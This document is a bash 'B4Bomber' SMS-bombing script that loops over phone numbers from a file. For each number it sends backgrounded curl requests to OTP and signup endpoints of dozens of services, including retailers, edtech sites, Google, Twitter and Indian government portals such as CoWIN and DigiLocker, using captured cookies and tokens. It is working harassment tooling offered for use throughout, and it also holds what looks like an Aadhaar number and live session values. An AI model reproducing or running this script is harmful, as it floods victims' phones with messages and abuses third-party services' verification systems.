...
while read -r max; 
do 
#<∅>----------B4Bomber--Created--By--M4U.XT----------</∅>
curl --silent --output /dev/null 'https://www.careers360.com/user/register?destination=?click_location=header&popup=iframe' \
  -H 'authority: www.careers360.com' \
  -H 'cache-control: max-age=0' \
  -H 'sec-ch-ua: " Not;A Brand";v="99", "Google Chrome";v="91", "Chromium";v="91"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'upgrade-insecure-requests: 1' \
  -H 'origin: https://www.careers360.com' \
  ...
  -H 'referer: https://www.careers360.com/user/register?destination=?click_location=header&popup=iframe' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'cookie: csrftoken=3rdQU5s7YNq9HYEeBMEQ1vP3f2GNUB9yEKUJgzGaKm6wKkaFkFzNsv7EZb5Q16nh; _gcl_au=1.1.1863305877.1622004003; _ga=GA1.2.690150436.1622004004; _gid=GA1.2.532606874.1622004004; __asc=c29631a2179a6f8f7505116658a; __auc=c29631a2179a6f8f7505116658a; _fbp=fb.1.1622004005256.1088788608; _omappvp=gIpXuT5Cxsxpz3C4JPhIgW4iUnMhPGqZZngflnqbXCoIe8CxrLJ4tdFi6gro5MUZSdkcbu9DHJtHsHf52L51ZR0hjbizQH3V; _omappvs=1622004005723; G_ENABLED_IDPS=google; WZRK_G=c4aa1a3ee7e84136b33a705a5fb5e27e; WZRK_S_654-ZZ4-5Z5Z=%7B%22p%22%3A1%2C%22s%22%3A1622004007%2C%22t%22%3A1622004007%7D; _gat_UA-46098128-1=1' \
  --data-raw 'csrfmiddlewaretoken=1jzYHw3SURt4JucoWbuTWc4vVNWdGb38CCgR30hVGq9rMQIPF4pQncm6FWlgNGhR&google_id=&uid=&profile_picture=&display_name=wqdfqwedff&email=qwfqwfq%40fywd.wfw&mobile_number='$max'&current_education_level=7&current_education_passing_year=&school_board=&aspiring_stream=&education_stream=1&location=Farooqnagar%2CTelangana&location_id=2856&source_url=https%3A%2F%2Fwww.careers360.com%2F&admission_help=Yes&csrfmiddlewaretoken=1jzYHw3SURt4JucoWbuTWc4vVNWdGb38CCgR30hVGq9rMQIPF4pQncm6FWlgNGhR' \
  --compressed -w '%{http_code}\n' & echo "$max"
#<∅>----------B4Bomber--Created--By--M4U.XT----------</∅>
curl --silent --output /dev/null 'https://www.cuemath.com/api/v4/login/' \
  -H 'authority: www.cuemath.com' \
  -H 'sec-ch-ua: " Not;A Brand";v="99", "Google Chrome";v="91", "Chromium";v="91"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36' \
  -H 'content-type: application/JSON' \
  -H 'accept: */*' \
  -H 'origin: https://www.cuemath.com' \
  -H 'sec-fetch-site: same-origin' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-dest: empty' \
  -H 'referer: https://www.cuemath.com/otp/?phone=$max&email=wdfjwnjif%40ijh.fdf&intent=header-booktrial-cta&full_name=efywiufgufiog&country_code=91&pincode=564566&country=india&theme=alternate&user=true' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'cookie: cue_country_code=IN; landing_page=%2F; _gcl_au=1.1.1150082786.1622003503; _gid=GA1.2.509968726.1622003503; cue_gacid=1437631042.1622003503; _fbp=fb.1.1622003506641.833580958; _CEFT=Q%3D%3D%3D; uts_id=uts1622003509.926; LCUTS_UID_901786=901786; intent=header-booktrial-cta; _ga=GA1.2.1437631042.1622003503; lcid=LC1622003511.7474895; usi_email_found=wdfjwnjif%40ijh.fdf; usi_sale_notes=wdfjwnjif%40ijh.fdf; _uetsid=5dfb38d0bddb11eb8c8a8fbec56f5a2f; _uetvid=5dfb8730bddb11ebb5784db1b61e81f1; _ce.s=v~655e24ea0fdead4d22d557e42c87d736a0389959~vv~4~ir~1; _ga_GNBBJJ7CG9=GS1.1.1622003502.1.1.1622003682.60' \
  --data-raw '{"action":"get_otp","phone":"'$max'","email":"wdfjwnjif@ijh.fdf","intent":"header-booktrial-cta","full_name":"efywiufgufiog","country_code":"91","pincode":"564566","country":"india","theme":"alternate","user":"true"}' \
  --compressed -w '%{http_code}\n' & echo "$max"
#<∅>----------B4Bomber--Created--By--M4U.XT----------</∅>
curl --silent --output /dev/null 'https://www.cuemath.com/api/v4/parents/' \
  -H 'authority: www.cuemath.com' \
  -H 'sec-ch-ua: " Not;A Brand";v="99", "Google Chrome";v="91", "Chromium";v="91"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36' \
  ...
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-dest: empty' \
  -H 'referer: https://www.cuemath.com/parent/signup/?intent=header-booktrial-cta&custom=header&theme=alternate&country=in' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'cookie: cue_country_code=IN; landing_page=%2F; _gcl_au=1.1.1150082786.1622003503; _gid=GA1.2.509968726.1622003503; cue_gacid=1437631042.1622003503; _fbp=fb.1.1622003506641.833580958; _CEFT=Q%3D%3D%3D; uts_id=uts1622003509.926; LCUTS_UID_901786=901786; intent=header-booktrial-cta; _ga=GA1.2.1437631042.1622003503; lcid=LC1622003511.7474895; _uetsid=5dfb38d0bddb11eb8c8a8fbec56f5a2f; _uetvid=5dfb8730bddb11ebb5784db1b61e81f1; usi_email_found=wdfjwnjif%40ijh.fdf; usi_sale_notes=wdfjwnjif%40ijh.fdf; itm_source=WEBSITE; itm_medium=header-booktrial-cta; itm_date=Wed%2C%2026%20May%202021%2004%3A32%3A40%20GMT; itm_date_ts=1622003560; _ce.s=v~655e24ea0fdead4d22d557e42c87d736a0389959~vv~3~ir~1; _ga_GNBBJJ7CG9=GS1.1.1622003502.1.1.1622003578.46' \
  --data-raw '{"intl_mobile":{"country_code":"91","phone":"'$max'","country":"india","countryCode":"91"},"notify":["notify_on_whatsapp"],"phone":"$max","email":"wdfjwnjif@ijh.fdf","full_name":"efywiufgufiog","pincode":"564566","referrer":"","country_code":"91","timezone":"Asia/Calcutta","notify_through":"notify_on_whatsapp","form_fields":"full_name,intl_mobile,email,pincode"}' \
  --compressed -w '%{http_code}\n' & echo "$max"
#<∅>----------B4Bomber--Created--By--M4U.XT----------</∅>
curl --silent --output /dev/null 'https://webapi.apollo247.com/' \
  -H 'authority: webapi.apollo247.com' \
  -H 'sec-ch-ua: " Not;A Brand";v="99", "Google Chrome";v="91", "Chromium";v="91"' \
  -H 'accept: */*' \
  ...
  -H 'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36' \
  -H 'content-type: application/json' \
  -H 'origin: https://www.apollo247.com' \
  -H 'sec-fetch-site: same-site' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-dest: empty' \
  -H 'referer: https://www.apollo247.com/' \
  -H 'accept-language: en-US,en;q=0.9' \
  --data-raw $'{"operationName":"Login","variables":{"mobileNumber":"+91'$max'","loginType":"PATIENT"},"query":"query Login($mobileNumber: String\u0021, $loginType: LOGIN_TYPE\u0021) {\\n  login(mobileNumber: $mobileNumber, loginType: $loginType) {\\n    status\\n    message\\n    loginId\\n    __typename\\n  }\\n}\\n"}' \
  --compressed -w '%{http_code}\n' & echo "$max"
#<∅>----------B4Bomber--Created--By--M4U.XT----------</∅>
curl --silent --output /dev/null 'https://www.nykaafashion.com/webscripts/api/otp/generate' \
  -H 'authority: www.nykaafashion.com' \
  -H 'cache-control: max-age=0' \
  -H 'sec-ch-ua: " Not;A Brand";v="99", "Google Chrome";v="91", "Chromium";v="91"' \
  -H 'x-csrf-token: Znitwg6WLbtNEHdB' \
  ...
  -H 'content-type: application/json' \
  -H 'accept: */*' \
  -H 'origin: https://www.nykaafashion.com' \
  -H 'sec-fetch-site: same-origin' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-dest: empty' \
  -H 'referer: https://www.nykaafashion.com/authorization?authPage=sign-up-mobile&redirectURL=%2F%40authPage%3Dsign-up-mobile' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'cookie: tm_stmp=1622343860260; NYKAA_NEW_DWEB_CART=1; USER_FORM_KEY=; countryName=IN; countryNameFull=India; CurrencyCode=INR; PHPSESSID=muk9kjnui0vqfgn28v1jkd4i23; TS0120e74a=01d63715f2be05269056de03f969973140b4a0cc775f609b38e045973b5f99dbe6f0e909eaeccf96ed761de2dfa6b0962d8db1db459f50d4b44cbe358b659a78f273b2c33a; TSd06dbe12027=089189808bab2000a46979068a337cd3ed23d5d6d68bd5ba2daf7507b2073b55a72e09485e19c41008e2424f3511300053df11798c4f7caed6ee52bff37621b2d86d9a9dcedf383ce36023cc9b5f3804a390d733a942970d6c8ea3edc6c0f309; NYKAA_VP_USER={"key":59,"ruleID":"start_v2"}; __stp={"visit":"new","uuid":"e030728a-4d10-464e-a699-02a5f5e16d51"}; AMCVS_FE9A65E655E6E38A7F000101%40AdobeOrg=1; __stdf=0; __stgeo="0"; __stbpnenable=1; s_cc=true; AMCV_FE9A65E655E6E38A7F000101%40AdobeOrg=1075005958%7CMCIDTS%7C18778%7CMCMID%7C52402473736717209951598442703892187490%7CMCAAMLH-1622948662%7C12%7CMCAAMB-1622948662%7C6G1ynYcLPuiQxYZrsz_pkqfLG9yMXBpb2zX5dvJdYQJzPXImdj0y%7CMCOPTOUT-1622351063s%7CNONE%7CMCAID%7CNONE%7CvVersion%7C4.4.1; _ga=GA1.2.1424560359.1622343863; _gid=GA1.2.22237454.1622343863; _gat_gtag_UA_114969681_1=1; __stat="BLOCK"; __sts={"sid":1622343862278,"tx":1622343866050,"url":"https%3A%2F%2Fwww.nykaafashion.com%2F%3FauthPage%3Dsign-up-mobile","pet":1622343866050,"set":1622343862278,"pUrl":"https%3A%2F%2Fwww.nykaafashion.com%2F","pPet":1622343862278,"pTx":1622343862278}; s_nr=1622343895592-New; s_sq=fsnecommercenykaadesignstudio%3D%2526c.%2526a.%2526activitymap.%2526page%253Dnds%25253Asign_up%25253Amobile%2526link%253DSubmit%2526region%253Dapp%2526pageIDType%253D1%2526.activitymap%2526.a%2526.c%2526pid%253Dnds%25253Asign_up%25253Amobile%2526pidt%253D1%2526oid%253DfunctionWn%252528%252529%25257B%25257D%2526oidt%253D2%2526ot%253DSUBMIT' \
  --data-raw '{"customer_mobile":"'$max'"}' \
  --compressed -w '%{http_code}\n' & echo "$max"
#<∅>----------B4Bomber--Created--By--M4U.XT----------</∅>
curl --silent --output /dev/null 'https://apps.ucoonline.in/Lead_App/send_message.jsp' \
  ...
  --data-raw 'mob=&ref_no=&otpv=&appRefNo=&lgName=fdgefgdgg&lgAddress=dfgdsggfesdggg&lgPincode=695656&lgState=DL&lgDistrict=NORTH+DELHI&lgBranch=0313&lgMobileno='$max'&lgEmail=sundeshaakshays%40gmail.com&lgFacilities=CC&lgTentAmt=656556565&lgRemarks=efwfwfsafw&declare_check=on&captchaRefno=315904&captchaResult=71' \
  --compressed -w '%{http_code}\n' & echo "$max"
#<∅>----------B4Bomber--Created--By--M4U.XT----------</∅>
curl --silent --output /dev/null 'https://user.india.com/user/verifyuserresend' \
  ...
  --data-raw '{"_token":"c6hvjEXovxGCaCI12UhlqQY3PYDjfrAsEglVvf7w","email":"","password":"DDsd12Q@www","first_name":"wdrqwefwe","last_name":"deqwrfwe","mobile":"'$max'","source":"indiadotcom","ru":"https://www.india.com","count":3,"uuid":"In682Of","tc_check":"false","utm_source":"https://www.google.com/","utm_medium":"Organic"}' \
  --compressed -w '%{http_code}\n' & echo "$max"
#<∅>----------B4Bomber--Created--By--M4U.XT----------</∅>
curl --silent --output /dev/null 'https://www.tatacliq.com/mobileloginapi/v1/authnuser/validate' \
  ...
  --data-raw '{"email":"","maskedPhoneNumber":"","otp":"","pass":"","phoneNumber":"'$max'","platformNumber":"11","currentOtp":"","newOtp":""}' \
  --compressed -w '%{http_code}\n' & echo "$max"
#<∅>----------B4Bomber--Created--By--M4U.XT----------</∅>
curl --silent --output /dev/null 'https://www.limeroad.com/auth/get_uuid_v2?ajax=true&ret=https://www.limeroad.com/auth/login?user_id_change=9825612384&ajax=true&mobileOnly=false&doAction=' \
  ...
  --data-raw 'utf8=%E2%9C%93&authenticity_token=2VXlD2cWJtUcKEmTxkdiQVwHSydt8cPebtelAXnSEi0%3D&user_id='$max'' \
  --compressed -w '%{http_code}\n' & echo "$max"
#<∅>----------B4Bomber--Created--By--M4U.XT----------</∅>
curl --silent --output /dev/null 'https://www.myntra.com/gateway/v1/auth/getotp' \
  ...
  --data-raw '{"phoneNumber":"'$max'"}' \
  --compressed -w '%{http_code}\n' & echo "$max"
#<∅>----------B4Bomber--Created--By--M4U.XT----------</∅>
curl --silent --output /dev/null 'https://www.snapdeal.com/sendOTP' \
  -H 'Connection: keep-alive' \
  -H 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"' \
  -H 'Accept: */*' \
  -H 'X-Requested-With: XMLHttpRequest' \
  ...
  --data-raw 'emailId=&mobileNumber='$max'&purpose=LOGIN_WITH_MOBILE_OTP' \
  --compressed -w '%{http_code}\n' & echo "$max"
#<∅>----------B4Bomber--Created--By--M4U.XT----------</∅>
curl --silent --output /dev/null 'https://www.snapdeal.com/signupAjax' \
  -H 'Connection: keep-alive' \
  -H 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"' \
  ...
  --data-raw '{"j_number":"'$max'","j_username":"wqwqw@gmail.com","j_name":"fgdfgd","j_dob":"05/05/1996","j_password":"gfdgdgfg","j_confpassword":"gfdgdgfg","CSRFToken":"c891a0feaae8ccb083082fd2c5d21b41bb5a2cae","targetUrl":"","mobileStart":"true","numberEdit":"false","socialid":"","gender":"","j_displayname":"","language":"","source":"","lastname":"","firstname":""}' \
  --compressed -w '%{http_code}\n' & echo "$max"
#<∅>----------B4Bomber--Created--By--M4U.XT----------</∅>
curl --silent --output /dev/null 'https://www.shoppersstop.com/login/register' \
  ...
  --data-raw 'fullName=efgwrgwrrr+feer&email=GWERWEFWR%40HERHER.EG&mobileNumber='$max'&gender=MALE&pwd=regwegeg&registerOtp=&CSRFToken=a1881cb3-94cc-4bb5-9f8c-c9977f475769' \
  --compressed -w '%{http_code}\n' & echo "$max"
#<∅>----------B4Bomber--Created--By--M4U.XT----------</∅>
curl --silent --output /dev/null 'https://bcas-prod.byjusweb.com/api/v2/send-otp' \
  ...
  -H 'accept-language: en-US,en;q=0.9' \
  --data-raw '{"phoneNumber":"'$max'","page":"free-trial-classes"}' \
  --compressed -w '%{http_code}\n' & echo "$max"
#<∅>----------B4Bomber--Created--By--M4U.XT----------</∅>
curl --silent --output /dev/null 'https://accounts.google.com/_/signup/sendidv?hl=en-GB&TL=AM3QAYaHYlMCgUOo_dtAjdTYh_cJZaHWvc5wWM1JcYHFPXuxz5cleTq6nG0XO4Hu&_reqid=842533&rt=j' \
...
curl --silent --output /dev/null 'https://www.olx.in/api/auth/authenticate?lang=en' \
  ...
  --data-raw '{"grantType":"phone","phone":"+91'$max'","language":"en"}' \
  --compressed -w '%{http_code}\n' & echo "$max"
#<∅>----------B4Bomber--Created--By--M4U.XT----------</∅>
curl --silent --output /dev/null 'https://www.digitalgujarat.gov.in/CitizenApp/Citizen/CitizenWEBUI/ForgotPassword.aspx' \
...
curl --silent --output /dev/null 'https://www.nvsp.in/Account/SendOTP?phonenumber='$max'&captcha=I0XE2' \
  ...
  --compressed -w '%{http_code}\n' & echo "$max"
#<∅>----------B4Bomber--Created--By--M4U.XT----------</∅>
curl --silent --output /dev/null 'https://cdn-api.co-vin.in/api/v2/auth/generateMobileOTP' \
  ...
  -H 'accept-language: en-US,en;q=0.9' \
  --data-raw '{"secret":"U2FsdGVkX1/d1gPD3UndCZLmVMLneTQ2tBoFrkSs3UVJtTFUr4fuNgKofObJwLVqs/GfPEIezePxqXtRehOtIw==","mobile":'$max'}' \
  --compressed -w '%{http_code}\n' & echo "$max"
#<∅>----------B4Bomber--Created--By--M4U.XT----------</∅>
curl --silent --output /dev/null 'https://apps.mgov.gov.in/registration-service' \
  -H 'Connection: keep-alive' \
  -H 'Cache-Control: max-age=0' \
  -H 'Upgrade-Insecure-Requests: 1' \
  ...
  --data-raw 'name=wfwfrfwfwfgwerfvwrvwr&email=wevwevwegeuifwyu%40gmail.com&mobile='$max'&state=Manipur&city=manipur&password=Symbol%3A%21%40%23%24%25%5E%26*&cnf_password=Symbol%3A%21%40%23%24%25%5E%26*&captcha=orbhrc' \
  --compressed -w '%{http_code}\n' & echo "$max"
#<∅>----------B4Bomber--Created--By--M4U.XT----------</∅>
curl --silent --output /dev/null 'https://auth.mygov.in/user/register?destination=oauth2/register/datagovindia' \
  -H 'Connection: keep-alive' \
  -H 'Cache-Control: max-age=0' \
  -H 'Upgrade-Insecure-Requests: 1' \
  ...
  --data-raw 'full_name=fgeggr&email=ergerger%40gov.in&gateway%5Bcountry%5D=91&number='$max'&links_fieldset%5Bdate%5D=15&links_fieldset%5Bmonth%5D=April&links_fieldset%5Byear%5D=2011&gender=male&referal-code=&op=Create+New+Account&form_build_id=form-tIh4z1LYmFhzquSUV0zOLuQQt5ueaJu8zpHTm8_DaVA&form_id=pwdless_registration&timezone=Asia%2FKolkata' \
  --compressed -w '%{http_code}\n' & echo "$max"
#<∅>----------B4Bomber--Created--By--M4U.XT----------</∅>
curl --silent --output /dev/null 'https://app.umang.gov.in/t/negd.gov.in/umang/coreapi/opn/ws2/openinitotp' \
  -H 'Connection: keep-alive' \
  ...
  -H 'Accept-Language: en-US,en;q=0.9' \
  --data-raw '{"tkn":null,"hmd":"","os":"","mcc":"","imei":"","pkg":"","clid":"","lat":"","lon":"","hmk":"","ver":"","mnc":"","acc":"","lac":"","peml":"","did":"","imsi":"","mod":"web","lang":"en","rot":"","mno":"'$max'","ort":"loginmob","st":"","uid":"","chnl":""}' \
  --compressed -w '%{http_code}\n' & echo "$max"
#<∅>----------B4Bomber--Created--By--M4U.XT----------</∅>
curl --silent --output /dev/null 'https://accounts.digitallocker.gov.in/signup/signup_request' \
  -H 'Connection: keep-alive' \
  -H 'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1' \
  -H 'Content-type: application/x-www-form-urlencoded' \
  -H 'Accept: */*' \
  ...
  --data-raw 'aadhaarNumber=923069986377&email=hsdfhkhd@gmail.com&mobile='$max'&name=fngngfngnfn&dob=04/05/1996&gender=M&pin=653265&token=AGe4cxKiu19efiYfo---dpRU4---xal/274tO4cvipTzcQzjHUvd9f79xJM0facqc0HghjkmGgJBhtvsCzgZYIxflsaufHmBqPYs8GUqQULoLcWvhC8AcOe7uuJKFAsavV2r8grLIDmf5ljGXoeOWwXGuw==' \
  --compressed -w '%{http_code}\n' & echo "$max"
#<∅>----------B4Bomber--Created--By--M4U.XT----------</∅>
curl --silent --output /dev/null 'https://www.flipkart.com/api/7/user/otp/generate' \
  -H 'Connection: keep-alive' \
  ...
  --data-raw '{"loginId":"+91'$max'","allLoginEntities":true}' \
  --compressed -w '%{http_code}\n' & echo "$max"
#<∅>----------B4Bomber--Created--By--M4U.XT----------</∅>
curl --silent --output /dev/null 'https://www.justdial.com/functions/whatsappverification.php' \
  -H 'authority: www.justdial.com' \
  -H 'sec-ch-ua: " Not;A Brand";v="99", "Google Chrome";v="91", "Chromium";v="91"' \
  -H 'accept: */*' \
  -H 'x-requested-with: XMLHttpRequest' \
  -H 'x-frsc-token: 1362e5210bc1bbd7e309f853583c7c0f0c5d1f45c646f1113068cc2afc36eabc' \
  -H 'sec-ch-ua-mobile: ?1' \
  -H 'user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36' \
  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \
  ...
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'cookie: bm_sz=A8669182789F821941ABC77BF598187F~YAAQ5oosMfiAEpR5AQAAHvlsuwtrmU8IpGyD1yyVDtxI6YDml2T6QhejZaSQYJD5lbiHEXRvZO9CX/PqQPA65H+mT3rqDMMfFK9n9Tm/chiQkhGWEMj8Uj0ha3a8mOehabVvy5swKwtYYiuQrtreMtJRGX5Ud/UyDzcgc1mQKeRBckw9i7RJek2eLI+CoGN2yeI=; PHPSESSID=7ueh867fqvodck5tnu417jbpn2; TKY=1362e5210bc1bbd7e309f853583c7c0f0c5d1f45c646f1113068cc2afc36eabc; _ctok=324ab853a41a2c4eecee80f47d3b315524db28d30ab84be631ce5aaa3c7e3e22; main_city=Mumbai; attn_user=logout; ppc=; AKA_A2=A; ak_bmsc=405171CCE3939F25E725DF15951160EF312CC005A2690000900DB3603A00BD0E~; _abck=21EAC230E76B90AFF618775DF57C887C~0~~-1~||-1||~-1; _ga=GA1.2.384764041.1622347158; _gid=GA1.2.1683170974.1622347158; _gat=1; scity=Mumbai; usrcity=Mumbai; inweb_city=Mumbai; dealBackCity=Mumbai; _gat_UA-31027791-3=1; _fbp=fb.1.1622347158196.480962707; bm_sv=EAAECA6BA100E830F067E3FF0DF1F312~VjzjU1/nk8Sm3+djzLFE3+eEF3ojOgdmnGfSVAJmsd8vY+yORrhzS3M2x2lwTXreqbL8ZSL0wcIfN2d8i1FdJqOC424kQVk4iaFFxthkUrWbs8R393mOePiBpcczJhV3pXSshseqQZ5EtF81a5MpEVwSu0VMamxrpIK7ZF1NAmA=; RT="z=1&dm=justdial.com&si=25e3c922-8654-4bc5-9273-f783bbe0c73f&ss=kpanltpe&sl=2&tt=dry&bcn=%2F%2F684d0d40.akstat.io%2F&nu=9y8m6cy&cl=bad&ld=fty"' \
  --data-raw 'mob='$max'&vcode=&rsend=0&name=asqwecfqwe' \
  --compressed -w '%{http_code}\n' & echo "$max"
#<∅>----------B4Bomber--Created--By--M4U.XT----------</∅>
curl --silent --output /dev/null 'https://www.justdial.com/functions/whatsappverification.php' \
  -H 'authority: www.justdial.com' \
  ...
  --data-raw 'mob='$max'&vcode=&rsend=0&name=jvbfhvbhbvhbj' \
  --compressed -w '%{http_code}\n' & echo "$max"
#<∅>----------B4Bomber--Created--By--M4U.XT----------</∅>
curl --silent --output /dev/null 'https://twitter.com/i/api/1.1/onboarding/begin_verification.json' \
  ...
  --data-raw '{"phone":"'$max'","use_voice":false,"send_auto_verify_hash":false,"flow_token":"g;162014758288810186:-1620147621403:fCJzeUJvWqRY7P01zD4HoXPW:0"}' \
  --compressed -w '%{http_code}\n' & echo "$max"
#<∅>----------B4Bomber--Created--By--M4U.XT----------</∅>
curl --silent --output /dev/null 'https://www.jio.com/JioWebService/rest/loginService/sendOtp' \
  -H 'Connection: keep-alive' \
  -H 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"' \
  -H 'Pragma: no-cache' \
  ...
  --data-raw '{"mobileNumber":"'$max'","loginFlowType":"MOBILE","alternateNumber":""}' \
  --compressed -w '%{http_code} -> ' & echo "$max"
#<∅>----------B4Bomber--Created--By--M4U.XT----------</∅>
done < m4u.xt # github.com/mahendraplus #
sleep 2
done
